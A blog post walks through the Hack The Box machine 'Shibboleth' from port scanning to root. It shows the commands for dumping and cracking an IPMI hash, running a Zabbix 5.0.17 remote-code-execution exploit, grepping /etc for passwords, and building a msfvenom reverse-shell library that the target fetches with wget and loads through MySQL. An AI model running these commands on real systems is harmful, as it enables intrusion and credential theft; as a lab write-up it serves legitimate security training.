---
layout: post
title: CTF Shibboleth
date:   2022-03-12 17:29:02 -0600
categories: CTF
tags: Linux
---
# /etc/hosts
10.10.11.124 shibboleth.htb

# nmap
```sh
nmap -sV shibboleth.htb

PORT STATE SERVICE VERSION 
80/tcp open http Apache httpd 2.4.41
```
We only have an apache server.

# gobuster

```sh
gobuster dir -t 100 -u http://shibboleth.htb/ -w ~/Documents/wordlist/directory-list-medium.txt


/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
/server-status        (Status: 403) [Size: 279]                             
```

## http://shibboleth.htb/forms/
![](https://i.imgur.com/hwLrBG4.png)
In the Readme.txt we have this:
```sh
Fully working PHP/AJAX contact form script is available in the pro version of the template.
You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
```
In the contact.php we have this:
```sh
Unable to load the "PHP Email Form" Library!
```

# Subdomain listing 
```sh
wfuzz -c -f sub-fighter -w Documents/wordlist/subdomains-top1million-5000.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" --hw 26
```
The --hw mean I will exclude every resultats with word 26.
![](https://i.imgur.com/JjPUFhl.png)

We also have an hint in main page.
![](https://i.imgur.com/wwNadhq.png)

# gobuster
```sh
gobuster dir -t 100 -u http://zabbix.shibboleth.htb -w ~/Documents/wordlist/directory-list-medium.txt -k

/modules              (Status: 301) [Size: 332] [--> http://zabbix.shibboleth.htb/modules/]
/assets               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/assets/] 
/audio                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/audio/]  
/local                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/local/]  
/app                  (Status: 301) [Size: 328] [--> http://zabbix.shibboleth.htb/app/]    
/js                   (Status: 301) [Size: 327] [--> http://zabbix.shibboleth.htb/js/]     
/include              (Status: 301) [Size: 332] [--> http://zabbix.shibboleth.htb/include/]
/conf                 (Status: 301) [Size: 329] [--> http://zabbix.shibboleth.htb/conf/]   
/vendor               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/vendor/] 
/fonts                (Status: 301) [Size: 330] [--> http://zabbix.shibboleth.htb/fonts/]  
/locale               (Status: 301) [Size: 331] [--> http://zabbix.shibboleth.htb/locale/] 
/server-status        (Status: 403) [Size: 286]
```
It's forbiden everywhere.
I found nothing and all the new exploits of zabbix don't work. 
I have to continue the enumeration.

# nmap UDP
```sh
sudo nmap -sU nmap -sU --min-rate 5000 shibboleth.htb

PORT      STATE  SERVICE
518/udp   closed ntalk
623/udp   open   asf-rmcp
16919/udp closed unknown
16972/udp closed unknown
30975/udp closed unknown
42431/udp closed unknown
44253/udp closed unknown
```

The port 623 is open.

# Exploit IPMI (port 623)
```sh 
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.11.124
run
...
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:5479a2ba820600003ad3a123b77e26a23ce881756019b75dec504d50007565022cf0fcdb1f86674ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2d636e7b85ec1c5ab81526480df9ff2e614f4379
```
# Crack the hash
I store the hash in the `hash` file.
I'm gonna use hashcat to crack it. 
```sh
hashcat -h |grep IPMI
```
Output
```sh
7300 | IPMI2 RAKP HMAC-SHA1                                | Network Protocol
```
So the command gonna be this one.
```sh
hashcat -m 7300 -a 0 hash /home/peanutstick/Documents/wordlist/rockyou.txt
```
![](https://i.imgur.com/tvZYZ5i.png)
I have a password.
# Zabbix
![](https://i.imgur.com/T4SLwub.png)
As we can see it's Zabbix 5.0.17.
I'm gonna use this exploit.
https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html
```sh
python3 exploit.py http://zabbix.shibboleth.htb Administrator Thepassword 10.10.14.147 4648
```
I'm in.
![](https://i.imgur.com/NjeFyWU.png)


# Privilege escalation
```sh
ls /home
```
Output
```sh
ipmi-svc
```
So we have to connect with this user and the password we found in the hash.
```sh
su ipmi-svc
```
# Enum with shell
I have to upgrade the shell first.
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now let's se if there is come creds in clear text.
```sh
grep --color=auto -rnw '/etc' -ie "Password" --color=always 2> /dev/null
```
![](https://i.imgur.com/KsbCPG0.png)
![](https://i.imgur.com/yDEBpLw.png)

# Exploit mysql
## Create the payload
You have to use an another port.
```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.147 LPORT=4649 -f elf-so -o exp.so
python2.7 -m SimpleHTTPServer 
```
Listen with netcat.
```sh
nc -nlvp 4649
```
## Upload the payload
On the server
```sh
mkdir /tmp/exp
cd /tmp/exp
wget http://10.10.14.147:8000/exp.so
```

## Execute the payload 
```sh
mysql -u zabbix -p
```
with mysql.
```mysql
SET GLOBAL wsrep_provider="/tmp/exp/exp.so"; 
```
![](https://i.imgur.com/RsOO332.png)
I'm root.

